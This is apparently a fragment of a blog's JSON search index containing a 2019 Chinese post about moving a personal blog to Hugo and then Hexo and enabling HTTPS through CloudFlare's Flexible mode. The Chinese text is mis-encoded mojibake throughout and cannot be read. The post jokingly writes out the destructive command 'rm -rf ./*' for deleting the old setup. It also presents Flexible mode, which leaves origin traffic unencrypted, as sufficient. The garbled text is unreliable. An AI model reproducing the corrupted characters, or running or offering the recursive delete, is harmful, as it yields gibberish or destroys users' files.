ä¸ºå•¥ä¸»é¢˜åƒå¥‡ç™¾æ€ªï¼ˆæ­¤å¤„çœç•¥ä¸€ä¸‡å­—åæ§½ï¼‰ï¼Œç”±äºæœ¬äººè¿‡èœä¸æƒ³è‡ªå·±é…ç½®å¤ªå¤šåªèƒ½é åæ§½ä¸ºç”Ÿï¼Œå¤§ä½¬å‹¿å–·åæ­£ä¹Ÿä¸ä¼šæœ‰å¤§ä½¬çœ‹çš„å§ã€‚å¥½å§é‚£æ—¢ç„¶å®˜æ–¹ä¸»é¢˜æ»¡â™‚è¶³ä¸äº†æˆ‘æˆ‘å°±æ‰¾ç¬¬ä¸‰æ–¹å‘—ï¼Œä½†æ˜¯ï¼Œå¥½åº·çš„æ˜¯æœ‰å•Šï¼Œä½†æ˜¯éƒ½è¦é’±å•Šï¼ˆæ­¤å¤„ç•™ä¸‹è´«ç©·çš„æ³ªæ°´ï¼‰ã€‚å¥½å§ï¼Œæ½‡æ´’è½¬èº«ï¼Œç¼“ç¼“æ‰“å‡º rm -rf ./* ï¼Œæ‹œæ‹œäº†æ‚¨å˜ã€‚ äºæ˜¯è½¬å‘é™æ€ç½‘ç«™å¯»æ±‚è§£å†³ï¼Œå—¯ï¼ŒçœŸé¦™ã€‚è¯´åˆ°é™æ€ç½‘ç«™å°±è¦æåˆ°è¿™ä¸‰å®¶ï¼šJekyll, Hugo å’Œ Hexoã€‚è¿™é‡Œæˆ‘é€‰æ‹©äº†é…ç½®ç®€å•ï¼Œä½†å¹¶æœªæ”¹å˜æˆ‘å¯¹æŠ€æœ¯çš„å‘å¾€ï¼ˆæ‰‹åŠ¨ç‹—å¤´ï¼‰ï¼Œä¸”ç”Ÿæˆé€Ÿåº¦å¿«çš„ Hugo ï¼ˆæœ€ç»ˆç”±äºä¸æ˜åŸå› å˜æˆäº† Hexoï¼‰ã€‚ é…ç½®æ–¹é¢å˜›ï¼Œæ‰“å¼€ GitHub ï¼Œæœç´¢ Hugo ï¼Œä¸‹è½½å¯¹åº”ç³»ç»Ÿçš„ Release ç‰ˆæœ¬ï¼Œé…ç½®å®Œæˆã€‚è¿™é‡Œä¸å¾—ä¸ç‚¹åè¡¨æ‰¬ä¸€ä¸‹ Hugo çš„å®˜æ–¹æ–‡æ¡£ï¼ŒçœŸçš„æ˜¯åº”æœ‰å°½æœ‰äº†ï¼Œç„¶åå†ç‚¹åè¡¨æ‰¬ä¸€ä¸‹å®˜æ–¹æ”¶å½•çš„ä¸»é¢˜ï¼Œè·Ÿéš”å£ç®—äº†é¢å‘çš„ç¾¤ä½“ä¸åŒä¸è¯´äº†ã€‚åœ¨æˆ‘ç©¶æå®¡ç¾çš„æŒ‡å¼•ä¸‹ï¼Œæˆ‘é€‰æ‹©äº†è¿™æ¬¾åå‘æç®€é£æ ¼çš„ Coder ä¸»é¢˜ï¼Œè‡ªå·±çœ‹ç€èˆ’æœå°±å¥½äº†ã€‚ ä» GitHub ä¸Š clone ä¸€ä¸‹ä¸»é¢˜ï¼Œç®€å•é…ç½®ä¸€ä¸‹ï¼Œå°±å¯ä»¥æŠ•å…¥ä½¿ç”¨äº†ã€‚ cnpm install hexo-cli -g è‡³æ­¤ï¼Œç¬¬äºŒä¸ªé—®é¢˜ â€œHow?â€ ä¹Ÿè§£å†³äº†ã€‚ ","date":"2019-10-23","objectID":"/posts/build-my-blog/:3:0","tags":["Blog"],"title":"åšå®¢æ­å»ºè¡€æ³ªå²","uri":"/posts/build-my-blog/"},{"categories":["å¿ƒè·¯å†ç¨‹"],"content":"0x03 ä½¿ç”¨ HTTPS è¿™é‡Œæˆ‘ä½¿ç”¨äº†ä¸€ä¸ªæå…¶è‰ç‡çš„æ–¹æ³•ï¼Œç›´æ¥ä½¿ç”¨äº† CloudFlare çš„ Flexible æ¨¡å¼ï¼Œç„¶åå† Page Rule é‡Œé…ç½®ä¸€ä¸‹å¼ºåˆ¶ä½¿ç”¨ HTTPS å³å¯ã€‚ ","date":"2019-10-23","objectID":"/posts/build-my-blog/:4:0","tags":["Blog"],"title":"åšå®¢æ­å»ºè¡€æ³ªå²","uri":"/posts/build-my-blog/"},{"categories":["å¿ƒè·¯å†ç¨‹"],"content":"0x04 æ€»ç»“ æ­å»ºåšå®¢å¹¶éä¸€ä¸ªç®€å•çš„äº‹ï¼Œè€ŒåŒä¸€ç§æ–¹æ³•ä¹Ÿä¸ä¸€å®šé€‚åˆæ‰€æœ‰äººï¼Œåªæœ‰ç»è¿‡è‡ªå·±çš„å°è¯•å‘ç°çœŸæ­£é€‚åˆè‡ªå·±çš„æ–¹æ³•ï¼Œæ‰èƒ½æ­å»ºå‡ºçœŸæ­£å±äºè‡ªå·±çš„åšå®¢ã€‚ ","date":"2019-10-23","objectID":"/posts/build-my-blog/:5:0","tags":["Blog"],"title":"åšå®¢æ­å»ºè¡€æ³ªå²","uri":"/posts/build-my-blog/"}]